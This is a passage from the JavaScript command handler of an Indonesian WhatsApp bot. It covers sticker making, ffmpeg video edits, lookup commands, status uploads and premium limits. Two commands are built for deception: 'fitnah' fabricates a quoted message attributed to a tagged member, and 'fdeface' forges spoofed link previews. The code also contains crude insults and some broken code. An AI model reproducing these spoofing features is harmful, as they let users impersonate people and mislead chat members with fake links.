            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
            case 'lirik':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
            case 'otaku':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            ALDI.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
            case 'komiku':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			            
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
            case 'chara':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await ALDI.sendMessage(from,li,image,{quoted: mek})
            break
            case 'pinterest':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await ALDI.sendMessage(from,di,image,{quoted: mek})
            break
            case 'playstore':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
           
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '?????????????????????????????????????????????????????????????????????\n'
            for (let i of play){
            store += `\n*??? _PLAY STORE_ ???*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n?????????????????????????????????????????????????????????????????????`
            }
            reply(store)
            break
            case 'on':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!mek.key.fromMe && !isOwner) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
            case 'status':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${public ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
            case 'off':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!mek.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
            case 'get':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			            
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
            case 'kontag':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            if (!mek.key.fromMe && !isOwner) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            ALDI.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
            case 'sticktag':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
            case 'totag':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            } else{
            reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
            }
            break
            case 'fitnah':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            ALDI.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
            case 'tomp3':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
           
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ALDI.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
            case 'fast':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			           
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ALDI.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
            case 'slow':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ALDI.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
            case 'reverse':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ALDI.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
            case 'anime':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ALDI.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            case 'kontak':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            ALDI.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
          	case 'stickergif':			
           	case 'stiker':			
           	case 'stikergif':			
           	case 's':			
           	case 'sgif':
           	case 'gifstiker':
           	case 'gifsticker':
           	case 'sticker':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
           	ator = "x-Ziyy"
           	namo = "SubscribeMe:"
           	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           	const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek	
           	const media = await ALDI.downloadAndSaveMediaMessage(encmedia)
           	ran = getRandom('.webp')
           	await ffmpeg(`./${media}`)
           	.input(media)
           	.on('start', function (cmd) {
           	console.log(`Started : ${cmd}`)
           	})
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            reply(mess.stick)
            })
            .on('end', function () {
            console.log('Finish')
            exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
            //if (error) {
            // reply(Zuxy.stikga())
            // fs.unlinkSync(media)
            // fs.unlinkSync(ran)
            //}
            ALDI.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(ran)
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.webp')
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
            //if (error) {
            // reply(Zuxy.stikga())
            // fs.unlinkSync(media)
            // fs.unlinkSync(ran)
            // }
            ALDI.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(ran)
            } else {
            reply(`sticker poto :\nKirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim\n\nsticker vidio :\nKirim Vidio atau vidio gif dengan caption ${prefix}stickergif atau tag vidio/vidiogif yang sudah dikirim\n\nNote : \nDurasi video maximal 9 detik`)
            }
           limitAdd(sender, limit)
            break
            case 'toimg':           
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            var b = fs.readFileSync(`./image/cewe.jpeg`)
            var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
            var media = await ALDI.downloadMediaMessage(encmedia)
            if (!isQuotedSticker) return reply('Reply Stikernya nya asu')
            ALDI.sendMessage(from, media, MessageType.image, { thumbnail: b, caption: 'Nihh dah Jadi Kak', quoted: mek})
            limitAdd(sender, limit)           
            break
            case 'exif':
	        if (!isOwner && !mek.key.fromMe) return reply('*Kamu Owner?*')
	        if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|autho`)
		    if (!args.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
		    exif.create(args.split('|')[0], args.split('|')[1])
		    reply('sukses')
	        break
	        
	        case 'colong':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
	        
		    if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		    const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await ALDI.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    ALDI.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: ftroli})
	        fs.unlinkSync(media)
		    fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
			})
            limitAdd(sender, limit)			
			break
	        case 'takestick':
		    
	        case 'take':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
	        			
	        if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}take nama|author*`)
			var pembawm = body.slice(6)
			var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			var media = await ALDI.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
			var packname = pembawm.split('|')[0]
			var author = pembawm.split('|')[1]
			exif.create(packname, author, `takestick_${sender}`)
			exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
			if (error) return reply('Error')
			ALDI.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: ftroli})
			fs.unlinkSync(media)
			fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
		    })
			break
	        case 'stikerwm':
	        case 'stickerwm':
            case 'swm':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            ALDI.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
            .on('exit', () => {
            ALDI.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            ALDI.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
            .on('exit', () => {
            ALDI.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
            case 'upswteks':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!q) return fakestatus('Isi teksnya!')
            ALDI.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
            case 'upswaudio':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (isQuotedAudio) {
            const swsw = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await ALDI.downloadMediaMessage(swsw)
            ALDI.sendMessage('status@broadcast', cihcih, audio, { caption: `${q}` }) 
            bur = `Sukses Upload Story Audio dengan Caption: ${q}`
            ALDI.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
            case 'upswimage':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await ALDI.downloadMediaMessage(swsw)
            ALDI.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            ALDI.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
            case 'upswvideo':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
           
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await ALDI.downloadMediaMessage(swsw)
            ALDI.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            ALDI.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
            case 'fdeface':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await ALDI.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await ALDI.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		ALDI.sendMessage(from, mat, MessageType.extendedText, anu)
            break
			
			case 'mode':
buttonnnss = [{buttonId: `${prefix}public`, buttonText: {displayText: 'PUBLIC????'}, type: 1},{buttonId: `${prefix}self`, buttonText: {displayText: 'SELF????'}, type: 1}]
const buMess = {
    contentText: "SELF/PUBLIC",
    footerText: 'Silahkan Pilih Salah Satu',
    buttons: buttonnnss,
    headerType: 1
}
await ALDI.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftroli})
break
case 'self':

			if (!isOwner && !mek.key.fromMe) return reply('*lu owner bukan kontol, babi, tai, memeg,*')

            if(!public)return reply('*_Fitur sudah diaktifkan sebelumnya_*')			

			public = false

			return replyWithFakeig(`

*??? MODE SELF ???*



${gaya}sukses ke Mode self

sekarang hanya nomor bot

dan owner yang bisa menggunakan

fitur.${gaya}`, text)

			break

			case 'public':

			if (!isOwner && !mek.key.fromMe) return reply('*lu owner bukan kontol, babi, tai, memeg,*')

			if(public)return reply('*_Fitur sudah diaktifkan sebelumnya_*')

			public = true

			return replyWithFakeig(`

*??? MODE PUBLIC ???*



${gaya}sukses ke Mode Public 

semua user dan admin

bisa menggunakan bot.${gaya}`, text)

			break
//******************** ???Owner Prem??? ********************\\
            case 'limit':
            case 'ceklimit':
            case 'balance':
            case 'glimit':
            replyWithFakeig(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
            break
            case 'buylimit':{
            if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
            if (q.includes('-')) return reply(`Jangan menggunakan -`)
            if (isNaN(q)) return reply(`Harus berupa angka`)
            let ane = Number(nebal(q) * 100)

            if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
            kurangBalance(sender, ane, balance)
            giveLimit(sender, nebal(q), limit)
            reply(monospace(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
            break
            case 'buyglimit':{
            if(!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
            const koinPerlimit = 100
            const total = koinPerlimit * q
            if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
            kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
            reply(monospace(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
            break
            case 'giflimit':
            if(!itsMe && !isOwner)return
            if (!q)return reply(`Example : ${prefix + command} @tag 10`)
            lim = q.split(" ")[1]
            const tag1 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
            giveLimit(tag1, lim, limit)
            reply('Succes')
            break   
           
case 'addprem':
            if (!itsMe && !isOwner)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
            if (!q)return reply(`*Format Error!*\n\n*Example :*\n??? *${prefix + command} @tag 10d*\n\n*Note :*\n??? s : detik\n??? m : menit\n??? h : jam\n??? d : hari\n\n*Tq To : ${fake}*`)
            expired = q.split(" ")[1]
            const pnom = {id: `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`,expired: Date.now() + toMs(expired)
            }
            premium.push(pnom)
            fs.writeFileSync('./data/premium.json',JSON.stringify(premium))
reply(`_Succses_`)
            break
            case 'delprem':
            if(!itsMe && !isOwner) return reply('Only Owner!')
            user = q.split('@')[1] + '@s.whatsapp.net'
for(let i=0; i<premium.length; i++){
if(user.includes(premium[i].id)){
            let del = premium.indexOf(premium[i])
            premium.splice(del, 1)
            fs.writeFileSync('./data/premium.json', JSON.stringify(premium))
            mentions(`Succes delete premium @${user.split("@")[0]}`,[user],true)

            }
            }
            break
            case 'listprem':
            if(!isGroup)return reply(mess.group)
            ALDI.updatePresence(from, Presence.composing)
